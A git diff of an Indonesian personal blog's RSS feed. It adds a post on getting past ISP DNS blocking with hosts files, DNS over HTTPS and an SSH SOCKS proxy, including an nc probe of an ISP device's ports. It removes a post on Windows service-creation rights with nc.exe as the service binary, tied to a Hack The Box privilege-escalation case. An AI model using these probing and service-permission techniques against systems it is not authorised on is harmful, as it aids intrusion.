@@ -43,6 +43,202 @@ Trace complete.
 <p>Berdasarkan hal diatas <code>www.reddit.com</code> di <em>resolve</em> ke <code>blockpage.sensor.id</code> yang alamat IPnya <code>***.215.248.131</code>. Kita bisa validasi apakah <code>***.215.248.78</code> merupakan alamat IP asli dari reddit dengan menggunakan <a href="https://toolbox.googleapps.com/apps/dig/#A/">Google Toolbox Dig</a>, dan hasilnya:</p>
 <p><div class="img-container"><img src="imgs/image-20211104095424598.png" alt="image-20211104095424598"  /></div>
 </p>
+<p>Ternyata alamat dari <code>www.reddit.com</code> adalah <code>151.101.X.140</code>, bukan <code>***.215.197.131</code>! Yah komputernya kena penipuan :/</p>
+<p>Anyway, alur <em>request</em>-nya bisa diilustrasikan seperti berikut.</p>
+<p><div class="img-container"><img src="imgs/image-20211103163418666.png" alt="image-20211103163418666"  /></div>
+</p>
+<p><em><strong>Darimana saya tau 10.19*.44.1 itu router ISP?</strong></em></p>
+<p>Nope, saya gak tau itu router atau bukan, tapi perangkat ini punya port SSH dan SNMP, jadi kemungkinan perangkat ini di monitor.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ nc -vn 10.***.44.1 <span class="m">22</span>
+Ncat: Version 5.59BETA1 <span class="o">(</span> http://nmap.org/ncat <span class="o">)</span>
+Ncat: Connected to 10.19*.44.1:22.
+SSH-2.0-OpenSSH_7.5
+$ nc -u -vn 10.***.44.1 <span class="m">161</span>
+Ncat: Version 5.59BETA1 <span class="o">(</span> http://nmap.org/ncat <span class="o">)</span>
+Ncat: Connected to 10.19*.44.1:161
+</code></pre></div><p><em><strong>Tapi kan HTTPS?</strong></em></p>
+<p>Enkripsi HTTPS/TLS itu ada di bagian kontennya. Jadi paket-paket DNS kueri yang dikirimkan untuk me-<em>resolve</em> nama domain ke sebuah alamat IP tidak masuk ke dalam enkripsi tersebut.</p>
+<blockquote>
+<p>Kueri DNS itu mendahului trafik HTTP/S</p>
+</blockquote>
+<p>Jadi misalnya ketika kita melakukan login di suatu HTTPS website, ISP gak akan tau username dan password yang kita masukkan, bentukan login page tersebut, dan bahkan sampai ke <em>endpoint</em> URLnya (<code>website.com/api/v1/login/?username=admin&amp;password=admin123</code>).</p>
+<figure>
+    <img src="imgs/image-20211104092043412.png"
+         alt="Contoh konten yang dienkripsi"/> <figcaption>
+            <p>Contoh konten yang dienkripsi
+            </p>
+        </figcaption>
+</figure>
+
+<p>Dengan kata lain, ISP hanya tau tujuan kita mau kemana, tapi dia (seharusnya) gak bisa lihat apa yang kita lakukan di tempat tujuan itu.</p>
+<p>Sampai disini, tentunya kita bisa menyimpulkan sendiri kenapa DoH bisa membuat komputer kita menghindari &ldquo;penipuan&rdquo; yang dilakukan DNS server ISP tersebut.</p>
+<p>Yap, karena kueri DNSnya dibungkus HTTPS. Jadi yang awalnya kueri DNS dikirimkan ke DNS server ISP pada port 53, sekarang kueri DNS di <em>deliver</em> melalui HTTPS ke <em>endpoint</em> DoH yang juga HTTPS, misalnya Cloudflare: <a href="https://cloudflare-dns.com/dns-query">https://cloudflare-dns.com/dns-query</a>.</p>
+<p><em><strong>Terus cloudflare-dns.com di resolve siapa?</strong></em></p>
+<p>DNSnya ISP wkwkw. Yah ketauan kan pakai DoH.</p>
+<h2 id="thou-shalt-bypass">Thou Shalt (By)Pass</h2>
+<h3 id="the-primivite-dns">The Primivite DNS</h3>
+<p>Tanpa DoH pun, sebenarnya kita bisa menghindari &ldquo;penipuan&rdquo; alamat tersebut di level cache.</p>
+<p>Sederhananya, alasan komputer kita membuat DNS kueri terlebih dahulu ke DNS server saat akan mengakses sebuah website adalah karena si komputer belum tau alamat IP dari website yang kita maksud.</p>
+<p>Setelah komputer tahu, alamat IP dan domain ini akan di simpan pada DNS resolver cache. Jadi ketika kita mengakses website yang sama, komputer kita akan mencarinya pada daftar cache terlebih dulu.</p>
+<blockquote>
+<p>Sebenarnya ada cache juga di level aplikasi/browser, tapi yasudahlah.</p>
+</blockquote>
+<p>Pada Windows, kita bisa lihat daftar DNS cache yang ada dengan menjalankan perintah:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\&gt;</span>ifconfig /displaydns
+</code></pre></div><p>Pada dasarnya DNS server itu hanyalah sekumpulan entry yang me-<em>mapping</em> alamat IP dengan nama domain secara dinamik. Di level OS sendiri terdapat sebuah file yang merupakan bentuk primivite dari DNS bersifat statik, yaitu file <code>hosts</code>.</p>
+<p>File <code>hosts</code> Windows bisa ditemukan di <code>C:\Windows\System32\drivers\etc\hosts</code> sedangkan untuk Unix-like, file <code>hosts</code> terdapat di <code>/etc/hosts</code>. Karena saya pengguna Windows sebagai main OS, yang akan di bahas disini adalah <code>hosts</code> file Windows saja.</p>
+<figure>
+    <img src="imgs/image-20211104123812239.png"
+         alt="Windows hosts file"/> <figcaption>
+            <p>Windows hosts file
+            </p>
+        </figcaption>
+</figure>
+
+<p>Pada Windows, file <code>hosts</code> ini akan selalu di-<em>load</em> ke DNS cache, dan kita bisa memanfaatkan ini untuk memberi &lsquo;tau&rsquo; langsung komputer bahwa alamat IP <code>www.reddit.com</code> adalah <code>151.101.129.140</code> dengan menambahkan entry berikut ke dalam file <code>hosts</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">151.101.129.140 reddit.com www.reddit.com
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20211104131236469.png" alt="image-20211104131236469"  /></div>
+</p>
+<p>Jalankan perintah yang sama untuk menampilkan DNS cache.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\&gt;</span>ipconfig /flushdns <span class="c1"># clear cache untuk menghilangkan brainwash dari DNS server ISP</span>
+C:<span class="se">\&gt;</span>ipconfig /displaydns
+</code></pre></div><p>Seharusnya saat ini <code>www.reddit.com</code> dan <code>reddit.com</code> berada di entry paling atas.</p>
+<p>Karena si komputer sudah tau alamat IP dari <code>www.reddit.com</code>, maka dia tidak perlu  lagi &ldquo;bertanya&rdquo; ke DNS server ISP.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ tracert -d www.reddit.com
+
+Tracing route to reddit.com <span class="o">[</span>151.101.129.140<span class="o">]</span>
+over a maximum of <span class="m">30</span> hops:
+
+  <span class="m">1</span>   <span class="m">120</span> ms     <span class="m">2</span> ms     <span class="m">3</span> ms  192.168.43.1
+  <span class="m">2</span>     *        *        *     Request timed out.
+  <span class="m">3</span>   <span class="m">162</span> ms    <span class="m">26</span> ms    <span class="m">26</span> ms  10.***.44.2
+  <span class="m">4</span>   <span class="m">160</span> ms    <span class="m">25</span> ms    <span class="m">30</span> ms  ***.215.36.238 
+  <span class="m">5</span>   <span class="m">187</span> ms    <span class="m">46</span> ms    <span class="m">46</span> ms  180.87.12.233
+  <span class="m">6</span>   <span class="m">186</span> ms    <span class="m">57</span> ms    <span class="m">50</span> ms  180.87.12.232
+  <span class="m">7</span>   <span class="m">191</span> ms    <span class="m">49</span> ms    <span class="m">47</span> ms  180.87.12.250
+  <span class="m">8</span>    <span class="m">49</span> ms    <span class="m">49</span> ms    <span class="m">48</span> ms  210.57.30.38
+  <span class="m">9</span>   <span class="m">188</span> ms    <span class="m">53</span> ms    <span class="m">52</span> ms  202.84.219.174
+ <span class="m">10</span>    <span class="m">70</span> ms    <span class="m">49</span> ms    <span class="m">52</span> ms  202.84.219.174
+ <span class="m">11</span>    <span class="m">60</span> ms    <span class="m">54</span> ms    <span class="m">49</span> ms  202.84.224.197
+ <span class="m">12</span>    <span class="m">83</span> ms    <span class="m">80</span> ms    <span class="m">85</span> ms  210.57.38.171
+ <span class="m">13</span>   <span class="m">205</span> ms   <span class="m">200</span> ms   <span class="m">203</span> ms  151.101.129.140 
+
+Trace complete.
+</code></pre></div><p><em><strong>Kalau untuk website lain gimana?</strong></em></p>
+<p>Google Toolbox!</p>
+<p><div class="img-container"><img src="imgs/image-20211104142819468.png" alt="image-20211104142819468"  /></div>
+</p>
+<p>Maka di <code>hosts</code> filenya:</p>
+<p><div class="img-container"><img src="imgs/image-20211104142858365.png" alt="image-20211104142858365"  /></div>
+</p>
+<h3 id="ssh-socks-proxy--doh">SSH SOCKS Proxy + DoH</h3>
+<p>Penggunaan <code>host</code> file dan DoH memang bisa mem-<em>bypass</em> Website, tapi pihak ISP tetap bisa mengetahui kita mengakses situs dan domain apa.</p>
+<p>Untuk menghindari itu, salah satu cara &lsquo;murah&rsquo; yang saya gunakan selain VPN adalah menggunakan <em>private server</em> lalu memanfaatkan fitur SOCK proxy dari SSH (jatuhnya transparan). Private server saya ini pakai Azure compute.</p>
+<p>Untuk membuat SSH SOCKS Proxy, perintahnya cukup simple:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ssh -i az_vm.key fproxy-user@20.109.***.213 -D <span class="m">1080</span> -N
+</code></pre></div><ul>
+<li><code>-D 1080</code>: Buka SOCKS proxy di port 1080 (listen)</li>
+<li><code>-N</code>: Tanpa SSH interactive shell.</li>
+</ul>
+<p>Saat ini SOCKS proxy via SSH sudah tersedia di 127.0.0.1:1080. Konfigurasinya di browser:</p>
+<p><div class="img-container"><img src="imgs/image-20211104161049841.png" alt="image-20211104161049841"  /></div>
+</p>
+<p>Mudah kan?</p>
+<p>Btw saya pakai ekstensi browser <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a>, supaya saat <em>switch on/off</em>-nya mudah dan gak harus buka-buka settingan browser, berikut tampilannya.</p>
+<p><div class="img-container"><img src="imgs/image-20211104160902204.png" alt="image-20211104160902204"  /></div>
+</p>
+<p>Konfigurasinya? sama dengan settingan browser!</p>
+<p><div class="img-container"><img src="imgs/image-20211104090204141.png" alt="image-20211104090204141"  /></div>
+</p>
+<p>Dengan mengirimkan <em>request</em> ke <code>ifconfig.co/json</code>, saat ini IP saya adalah IP dari si private server.</p>
+<p><div class="img-container"><img src="imgs/image-20211104090145368.png" alt="image-20211104090145368"  /></div>
+</p>
+<p>Lalu ditambah dengan DoH dan di test lewat <a href="https://dnsleaktest.com/">https://dnsleaktest.com/</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20211104090533201.png" alt="image-20211104090533201"  /></div>
+</p>
+<p>Sampai sini seharusnya ISP kurang lebih hanya melihat komputer saya yang mengakses si private server dengan trafik seperti berikut.</p>
+<p><div class="img-container"><img src="imgs/image-20211104152555436.png" alt="image-20211104152555436"  /></div>
+</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Jadi setidaknya ada 3 solusi di post ini yang bisa kamu coba untuk bypass filters yang diterapkan oleh ISP langganan kamu:</p>
+<ul>
+<li>Hosts file,</li>
+<li>DoH,</li>
+<li>DoH+SSH SOCKS Proxy.</li>
+</ul>
+<p>Menggunakan hosts file dan DoH hanya sebatas menghindari komputer kita dari &ldquo;penipuan&rdquo; alamat palsu oleh DNS server ISP. Sedangkan DoH+SSH SOCKS Proxy selain menghindari &ldquo;penipuan&rdquo;, tunnel yang dibuat juga mengenkripsi keseluruhan trafik web kita.</p>
+<p>Hasil <em>testing</em> ketiganya, bukan <em>testing</em> sih, bisa ditabelkan(?) seperti berikut.</p>
+<div class="force-center">
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Bypass DNS filters</th>
+<th>Hide the domain we visit ?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Hosts file</td>
+<td>Probably yes</td>
+<td>No</td>
+</tr>
+<tr>
+<td>DoH</td>
+<td>Yes, mostly</td>
+<td>No</td>
+</tr>
+<tr>
+<td>DoH + SSH SOCKS Proxy</td>
+<td>Yes, mostly, but it depends.</td>
+<td>Yes</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><em><strong>Apakah dengan ini saya sudah <del>bisa menjadi anggota</del> anonymous?</strong></em></p>
+<p>Nope, karena private server yang saya pakai pun milik sesuatu yang lebih besar dari ISP dan dua-duanya mengumpulkan data juga.</p>
+<p>Baiklah, sekian untuk postingan ini~</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>DNS, DNS over HTTPS dan SSH SOCKS Proxy [ID]</title>
+      <link>https://fahmifj.github.io/blog/dns-over-https-and-ssh-socks-proxy/</link>
+      <pubDate>Thu, 04 Nov 2021 16:40:44 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/blog/dns-over-https-and-ssh-socks-proxy/</guid>
+      <description>Can we use these to bypass DNS filters and conceal ourselves from ISPs? Let&amp;#39;s try it anyway</description>
+      <content:encoded><![CDATA[<p>Saat ini sebagian besar browser-browser populer sudah memiliki fitur DNS over HTTPS (DoH). Tapi meskipun begitu, ternyata masih banyak yang belum tau tentang adanya fitur ini.</p>
+<p><em><strong>Loh tau dari mana?</strong></em></p>
+<p><em>Flashback</em> sedikit, ada beberapa teman yang setiap kali mau mengakses reddit atau web streaming anime <del>i</del>legal, mereka harus pakai VPN untuk bypass blokirannya ISP. Karena VPN-nya ini gratisan (baca: dipakai berjamaah dan di limit), sudah pasti jatuhnya lemot.</p>
+<p>Setelah mereka tau soal fitur DoH, salah satunya memberi respon berikut:</p>
+<p><div class="img-container"><img src="imgs/image-20211103210137432.png" alt="image-20211103210137432"  /></div>
+</p>
+<p>Agak risih juga sih ISP di negara ini sukanya main bloc-bloc-an.</p>
+<p>Nah di postingan ini saya akan coba bahas kenapa DoH bisa dipakai untuk mem-<em>bypass</em> website yang diblokir. Saya juga bakal cari tau apakah DoH dan SSH SOCKS Proxy sudah cukup untuk menyembunyikan kita dari ISP.</p>
+<h2 id="how-do-isps-block-websites">How do ISPs block websites?</h2>
+<p>Normalnya ketika kita mengakses sebuah situs, misal <code>www.reddit.com</code>, komputer kita akan mengirimkan sebuah kueri DNS ke sebuah DNS server (milik ISP/operator seluler yang kalian pakai) untuk menanyakan alamat IP dari domain <code>www.reddit.com</code> agar halaman situs tersebut bisa dimuat kemudian.</p>
+<p>Saat kita mengakses situs yang terdaftar di <em>blacklist</em> DNS, maka DNS tersebut memberikan alamat IP palsu dari halaman blokir milik si ISP seperti merconsuar, ipo, dll.</p>
+<p>Kita bisa liat alur-nya secara detail dengan WireShark, tetapi agar lebih simple, kita juga bisa menggunakan <code>tracert</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ tracert -4 -d -h <span class="m">5</span> www.reddit.com
+
+Tracing route to blockpage.****.id <span class="o">[</span>***.215.197.131<span class="o">]</span> 
+over a maximum of <span class="m">5</span> hops:
+
+  <span class="m">1</span>     <span class="m">2</span> ms     <span class="m">2</span> ms     <span class="m">2</span> ms  192.168.1.1 
+  <span class="m">2</span>     *        *        *     Request timed out.
+  <span class="m">3</span>    <span class="m">38</span> ms    <span class="m">32</span> ms    <span class="m">24</span> ms  10.***.44.1 
+  <span class="m">4</span>    <span class="m">26</span> ms    <span class="m">31</span> ms    <span class="m">22</span> ms  ***.215.248.78 
+  <span class="m">5</span>    <span class="m">33</span> ms    <span class="m">25</span> ms    <span class="m">27</span> ms  ***.215.248.82 
+
+Trace complete.
+</code></pre></div><blockquote>
+<p>Di hop kedua saya kurang yakin apakah modem punya Hop count juga seperti router, yang akhirnya ditampilkan  * * *.</p>
+</blockquote>
+<p>Berdasarkan hal diatas <code>www.reddit.com</code> di <em>resolve</em> ke <code>blockpage.sensor.id</code> yang alamat IPnya <code>***.215.248.131</code>. Kita bisa validasi apakah <code>***.215.248.78</code> merupakan alamat IP asli dari reddit dengan menggunakan <a href="https://toolbox.googleapps.com/apps/dig/#A/">Google Toolbox Dig</a>, dan hasilnya:</p>
+<p><div class="img-container"><img src="imgs/image-20211104095424598.png" alt="image-20211104095424598"  /></div>
+</p>
 <p>Ternyata alamat dari <code>www.reddit.com</code> adalah <code>151.101.X.140</code>, bukan <code>112.***.197.131</code>! Yah komputernya kena penipuan :/</p>
 <p>Anyway, alur <em>request</em>-nya bisa diilustrasikan seperti berikut.</p>
 <p><div class="img-container"><img src="imgs/image-20211103163418666.png" alt="image-20211103163418666"  /></div>
@@ -443,236 +639,6 @@ $ git push -u origin main
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="nb">echo</span>  <span class="s1">&#39;alias gedit=&#34;gedit-null&#34;&#39;</span>  &gt; ~/.zshrc
 $ <span class="nb">source</span> ~/.zshrc
 </code></pre></div>]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>Windows Services: Start a Service During Its Creation [ID]</title>
-      <link>https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/</link>
-      <pubDate>Thu, 12 Aug 2021 22:04:18 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/</guid>
-      <description>Eksplorasi Windows Service</description>
-      <content:encoded><![CDATA[<p>Tahun lalu (ternyata udah setahun), saya sempat baca dua buah postingan blog yang membahas tentang Windows Service. Postingan pertama adalah &ldquo;beyond root&rdquo; dari mesin Resolute dari Hack The Box yang ditulis oleh <a href="https://twitter.com/0xdf_">0xdf</a> dan yang kedua adalah postingan yang ditulis oleh <a href="https://twitter.com/VbScrub">VbScrub</a>. Kedua postingan tersebut dapat dibaca ditautan berikut:</p>
-<ul>
-<li>
-<p><a href="https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html">https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html</a></p>
-</li>
-<li>
-<p><a href="https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/">https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/</a></p>
-</li>
-</ul>
-<p>Di postingan pertama, 0xdf lebih membahas tentang <code>psexec</code>-nya Impacket dan tool serupa lainnya (teknikal), sedangkan di postingan kedua, VbScrub melanjutkan <em>kulikan<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>nya</em>-nya 0xdf dan lebih membahas tentang Windows service-nya.</p>
-<p>Berkat kedua postingan tersebut, saya jadi tertarik juga untuk ngulik dan nyelam ke dokumentasi API Windows service.</p>
-<p>Sekilas definisi, service sederhananya service adalah suatu program yang berjalan di belakang layar. Untuk Linux/Unix-like, biasanya disebut Daemon. Contohnya: Windows Update, Firewall, Audio processing seperti Realtek misalnya, dll.</p>
-<p><div class="img-container"><img src="imgs/image-20210812024145951.png" alt="image-20210812024145951"  /></div>
-</p>
-<div class="force-center"><small> Sumber colongan tertera </small></div>
-<h2 id="creation-of-a-service">Creation of a Service</h2>
-<p>Pada Windows, sebuah service dapat dibuat dengan menggunakan command-line utility bawaan Windows bernama <code>sc.exe</code>. Berikut contoh penggunaannya.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\&gt;</span> sc.exe create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\program.exe&#34;</span>
-</code></pre></div><ul>
-<li>MyService = Nama service</li>
-<li>binPath = Lokasi executable program (+ argument)</li>
-</ul>
-<p>Kedua argumen diatas wajib disuplai (minimal).</p>
-<p>Pembuatan service <code>MyService</code> akan berhasil jika perintah tersebut jalankan pada elevated (admin) terminal , atau user yang menjalankannya memiliki hak membuat service (<code>SC_MANAGER_CREATE_SERVICE</code>).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
-<span class="o">[</span>SC<span class="o">]</span> CreateService SUCCESS
-</code></pre></div><p>Jika bukan elevated atau tanpa hak untuk membuat service, maka hasil yang diberikan oleh <code>sc.exe</code> adalah pesan &ldquo;Access is denied&rdquo;.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc.exe create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
-<span class="o">[</span>SC<span class="o">]</span> OpenSCManager FAILED 5:
-
-Access is denied.
-</code></pre></div><p>Sedangkan untuk mengetahui tahap pembuatan/instalasi sebuah service, kita bisa mengacu kepada contoh kode bahasa C dari <a href="https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service">dokumentasi Microsoft</a> berikut.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">VOID</span> <span class="nf">SvcInstall</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="n">SC_HANDLE</span> <span class="n">schSCManager</span><span class="p">;</span>
-    <span class="n">SC_HANDLE</span> <span class="n">schService</span><span class="p">;</span>
-    <span class="n">TCHAR</span> <span class="n">szPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
-
-    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="n">GetModuleFileName</span><span class="p">(</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">szPath</span><span class="p">,</span> <span class="n">MAX_PATH</span> <span class="p">)</span> <span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Cannot install service (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
-        <span class="k">return</span><span class="p">;</span>
-    <span class="p">}</span>
-    
-     <span class="c1">// Creation of a Service: STEP 1
-</span><span class="c1"></span>    <span class="c1">// Get a handle to the SCM database.
-</span><span class="c1"></span>    <span class="n">schSCManager</span> <span class="o">=</span> <span class="n">OpenSCManager</span><span class="p">(</span>
-        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// local computer
-</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// ServicesActive database
-</span><span class="c1"></span>        <span class="n">SC_MANAGER_ALL_ACCESS</span><span class="p">);</span>  <span class="c1">// full access rights
-</span><span class="c1"></span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">schSCManager</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;OpenSCManager failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
-        <span class="k">return</span><span class="p">;</span>
-    <span class="p">}</span>
-     <span class="c1">// Creation of a Service: STEP 2
-</span><span class="c1"></span>    <span class="c1">// Create the service
-</span><span class="c1"></span>    <span class="n">schService</span> <span class="o">=</span> <span class="n">CreateService</span><span class="p">(</span>
-        <span class="n">schSCManager</span><span class="p">,</span>              <span class="c1">// SCM database
-</span><span class="c1"></span>        <span class="n">SVCNAME</span><span class="p">,</span>                   <span class="c1">// name of service
-</span><span class="c1"></span>        <span class="n">SVCNAME</span><span class="p">,</span>                   <span class="c1">// service name to display
-</span><span class="c1"></span>        <span class="n">SERVICE_ALL_ACCESS</span><span class="p">,</span>        <span class="c1">// desired access
-</span><span class="c1"></span>        <span class="n">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// service type
-</span><span class="c1"></span>        <span class="n">SERVICE_DEMAND_START</span><span class="p">,</span>      <span class="c1">// start type
-</span><span class="c1"></span>        <span class="n">SERVICE_ERROR_NORMAL</span><span class="p">,</span>      <span class="c1">// error control type
-</span><span class="c1"></span>        <span class="n">szPath</span><span class="p">,</span>                    <span class="c1">// path to service&#39;s binary
-</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no load ordering group
-</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no tag identifier
-</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no dependencies
-</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// LocalSystem account
-</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">);</span>                     <span class="c1">// no password
-</span><span class="c1"></span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">schService</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;CreateService failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
-        <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schSCManager</span><span class="p">);</span>
-        <span class="k">return</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">else</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Service installed successfully</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-
-    <span class="c1">// Creation of a Service: STEP 3
-</span><span class="c1"></span>    <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schService</span><span class="p">);</span>
-    <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schSCManager</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><p>Secara garis besar, tahap pembuatan service adalah seperti berikut:</p>
-<ol>
-<li>Program membuat koneksi ke Service Control Manager (SCM) dengan memanggil fungsi <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw">OpenSCManager</a>. Fungsi ini mengembalikan sesuatu (return value) yang disebut <strong>handle</strong> (selanjutnya disebut <a href="https://docs.microsoft.com/en-us/windows/win32/services/scm-handles">handle SCM</a>). Handle SCM ini memegang level akses tertentu terhadap SCM, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-the-service-control-manager">disini</a>.</li>
-<li>Handle SCM bersama dengan argumen lainnya yang disuplai seperti &ldquo;nama service&rdquo; dan &ldquo;binPath&rdquo; akan di-passing ke fungsi  <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew">CreateService()</a> untuk membuat service. Fungsi <code>CreateService()</code> ini memiliki return value berupa <strong>handle</strong> (kita sebut handle SVC) dengan level akses tertentu juga, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-a-service">disini</a>.</li>
-<li>Di tahap ini, pesan sukses ditampilkan, lalu handle SCM dan handle SVC <u>ditutup</u> dan program keluar.</li>
-</ol>
-<blockquote>
-<ul>
-<li>SCM sederhananya dapat dianggap sebagai database dari service.</li>
-<li>Handle SCM menentukan apakah kita dapat melakukan read/write access pada SCM dan handle SVC menentukan apakah kita dapat mengontrol suatu service. Didapatkannya handle SVC sendiri bergantung pada level akses handle SCM.</li>
-</ul>
-</blockquote>
-<p>Pada potongan kode sebelumnya akses handle SCM adalah <code>SC_MANAGER_ALL_ACCESS</code>, yang mana bisa diasumsikan bahwa hal ini memerlukan elevated process. Sedangkan berdasarkan kasus mesin Resolute yang diulas oleh 0xdf, handle SCM dengan akses <code>SC_MANAGER_CREATE_SERVICE</code> pun sudah cukup untuk membuat service.</p>
-<h2 id="starting-a-service">Starting a Service</h2>
-<p>Masih dengan tool yang sama (<code>sc.exe</code>), sebuah service dapat di jalankan dengan perintah berikut.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\&gt;</span>sc start MyService
-</code></pre></div><p>Normalnya, service yang berhasil dibuat oleh user menggunakan <code>sc.exe</code> dalam mode elevated atau user dengan hak <code>SC_MANAGER_CREATE_SERVICE</code> tidak akan bisa dikontrol (start, stop) oleh <u>regular user</u>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
-<span class="o">[</span>SC<span class="o">]</span> CreateService SUCCESS
-
-C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc start MyService
-<span class="o">[</span>SC<span class="o">]</span> StartService: OpenService FAILED 5:
-
-Access is denied.
-</code></pre></div><p>Pada contoh diatas, pembuatan service berhasil karena user <code>fahmi</code> memiliki hak <code>SC_MANAGER_CREATE_SERVICE</code>, tetapi tidak memiliki kontrol atas service yang dibuatnya.</p>
-<p>Jika melihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service">dokumentasi</a> Microsoft, yang juga dalam bahasa C, tahapan menjalankan sebuah service tanpa <code>sc.exe</code> secara garis besarnya adalah seperti berikut:</p>
-<ol>
-<li>Membuat koneksi ke SCM database dan mendapatkan handle SCM dengan level akses tertentu</li>
-<li>Handle SCM kemudian di-passing ke fungsi <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicew">OpenService()</a>. Fungsi ini mengembalikan handle SVC dengan level akses tertentu.</li>
-<li>Handle SVC yang didapat dipassing ke <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew">StartService</a> untuk mulai menjalankan service.</li>
-</ol>
-<p>Dari ketiga tahap menjalankan service tersebut, regular user tentunya akan mendapat galat berupa &ldquo;Access is denied&rdquo; di tahap 2 karena handle SVC tidak didapatkan dan handle SCMnya hanya sebatas level user.</p>
-<h2 id="dont-close-the-handles">Don&rsquo;t Close the Handles!</h2>
